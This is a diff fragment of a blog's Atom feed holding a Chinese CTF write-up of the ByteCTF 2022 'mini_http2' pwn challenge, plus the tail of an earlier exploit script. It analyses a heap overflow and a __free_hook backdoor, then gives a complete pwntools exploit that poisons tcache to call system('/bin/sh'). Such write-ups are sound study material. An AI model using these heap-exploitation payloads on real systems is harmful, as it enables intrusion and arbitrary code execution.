+buyCar(p64(0xffffffff)) # hijack winTimes
+
+buyFlag()
+
+# g()
+
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ByteCTF2022-PWN-复现]]></title>
+        <id>https://kotoriseed.github.io/post/bytectf2022/</id>
+        <link href="https://kotoriseed.github.io/post/bytectf2022/">
+        </link>
+        <updated>2022-11-19T09:50:20.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>今年bytectf没来得及去打，但是题目质量是很高的，现在重新做一下当时的题</p>
+</blockquote>
+<h1 id="pwn">PWN</h1>
+<h2 id="mini_http2">mini_http2</h2>
+<h3 id="分析">分析</h3>
+<p>libc的版本是2.35，但是main函数的开头将<code>__free_hook</code>的地址存到了bss段上，有点东西。</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/c8a1fa409c0b9.png" alt="1668849923953.png" loading="lazy"></figure>
+<p>交叉引用看了下，果然存在后门，如果将<code>system</code>的地址写入<code>__free_hook</code>中，就能执行<code>system(s1);</code></p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/178b1853c7e1a.png" alt="1668850053122.png" loading="lazy"></figure>
+<p>继续逆。发现在注册功能中，<code>s1</code>直接就是get传参传进来的<code>username</code>的值。</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/0f4fa84f953bb.png" alt="1668850217566.png" loading="lazy"></figure>
+<p>登录功能也直接白给了libc上的地址，</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/d7d4512850bdb.png" alt="1668850305271.png" loading="lazy"></figure>
+<p>比较要命的地方来了。post和get传参逆的时候其实都还不算累，但是审管理堆块的功能时，发现他对表达式的解析有一点诡异（可能只是我之前没见过，熟练的师傅都一眼顶针了）</p>
+<p><code>sub_2EB9</code>函数中对postdata的解析极其复杂，以至于我逆了相当长一段时间。然后发现，这不就是json的格式吗（捂脸哭）</p>
+<p>下面来看一下用得上的功能：</p>
+<ul>
+<li><strong>add_worker:</strong></li>
+</ul>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/f53effa8b1b64.png" alt="1668850636058.png" loading="lazy"></figure>
+<p>使用的是<code>strdup</code>来调用<code>malloc</code>创建堆块，大小控制在0x110以内，数量最多16个，创建完成过后会白给堆上的指针。</p>
+<ul>
+<li><strong>del_worker:</strong></li>
+</ul>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/4d25c557be4f5.png" alt="1668850849248.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/ae0d8edc87c52.png" alt="1668850889535.png" loading="lazy"></figure>
+<p>删除功能中不存在直接的uaf</p>
+<ul>
+<li><strong>edit_worker:</strong></li>
+</ul>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/b57f6c9ceb4ff.png" alt="1668850969805.png" loading="lazy"></figure>
+<p>问题主要就出在这个功能中，直接使用<code>memcpy</code>将传入的数据拷贝到指定堆块中去，并没有和创建时的大小进行比较。所以是存在堆溢出的，但是由于判断长度使用的是<code>strlen</code>，所以payload会被<code>\x00</code>截断。</p>
+<p>接下来就是构造堆溢出，劫持tcache bin的链表，整个过程并不复杂，但由于该题在处理协议的时候使用了大量的<code>malloc</code>和<code>free</code>，所以堆布局相对来说十分混乱，需要注意一下。且版本是2.35，在tcache bin和fastbin的单链表中都有宏去保护指针，需要处理一下。</p>
+<p>（逆协议的过程就省去了，有不理解的地方的话可以参考exp来理解，或者直接联系我）</p>
+<h3 id="exp">exp</h3>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+
+p = process('./mini_http2')
+elf = ELF('./mini_http2')
+libc = elf.libc
+
+sla = lambda x,y : p.sendlineafter(x,y)
+sa  = lambda x,y : p.sendafter(x,y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g(arg=''):
+	gdb.attach(p)
+	raw_input()
+
+def get(url):
+	pay = b'\x00' + p16(len(url)+7)[::-1] + b'\x01\x05'
+	pay = pay.ljust(0x9, b'\x00')
+	p.send(pay)
+	pay = b'\x82\x86\x44' + p32(len(url))[::-1]
+	pay += url
+	p.send(pay)
+
+def post(url, postdata):
+	pay = b'\x00' + p16(len(url)+7)[::-1] + b'\x01\x05'
+	pay = pay.ljust(0x9, b'\x00')
+	p.send(pay)
+	pay = b'\x83\x86\x44' + p32(len(url))[::-1]
+	pay += url
+	p.send(pay)
+	pay = b'\x00' + p16(len(postdata))[::-1]
+	pay = pay.ljust(0x9, b'\x00')
+	p.send(pay)
+	p.send(postdata)
+
+def add_worker(name, desc):
+	pay = b'{&quot;name&quot;: &quot;' + name + b'&quot;, '
+	pay += b'&quot;desc&quot;: &quot;' + desc + b'&quot;}'
+	post(b'/api/add_worker', pay)
+
+def del_worker(idx):
+	pay = b'{&quot;worker_idx&quot;: ' + idx + b' }'
+	post(b'/api/del_worker', pay)
+
+def edit_worker(name, desc, idx):
+	pay = b'{&quot;name&quot;: &quot;' + name + b'&quot;, '
+	pay += b'&quot;desc&quot;: &quot;' + desc + b'&quot;,'
+	pay += b'&quot;worker_idx&quot;: ' + idx + b' }'
+	post(b'/api/edit_worker', pay)
+
+get(b'/register?username=/bin/sh&amp;password=kotori')
+get(b'/login?username=/bin/sh&amp;password=kotori')
+
+ru('\'gift\': &quot;0x')
+libcbase = int(ru('}')[:-2], 16) - 0xc4200
+# print(hex(libcbase))
+hook = libcbase + libc.symbols['__free_hook']
+system = libcbase + libc.symbols['system']
+
+add_worker(b'1'*0x80, b'2'*0x80) # 0
+ru('name_addr&quot;: &quot;0x')
+heapbase = int(ru('&quot;')[:-1], 16) - 0x800
+# print(hex(heapbase))
+
+add_worker(b'3'*0x80, b'4'*0x80) # 1
+add_worker(b'5'*0x80, b'6'*0x80) # 2
+del_worker(b'1')
+del_worker(b'2')
+
+add_worker(b'7'*0x80, b'8'*0x8) # 1
+add_worker(b'9'*0x80, b'a'*0x8) # 2
+add_worker(b'b'*0x80, b'c'*0x8) # 3
+add_worker(b'd'*0x80, b'e'*0x8) # 4
+del_worker(b'2')
+del_worker(b'4')
+
+pay = b'a'*0x90 + p64(((heapbase+0xa00)&gt;&gt;12)^(hook-0x78))[:6]
+edit_worker(pay, b'kotori', b'3')
+
+add_worker(b'9'*0x80, b'a'*0x8) # 2
+pay = b'a'*0x78 + p64(system)[:6]
+add_worker(pay, b'a'*0x8) # 4
+
+get(b'/exit')
+
+# g()
+
+p.interactive()
+</code></pre>
+<p>（待续）</p>
+]]></content>
+    </entry>
+</feed>
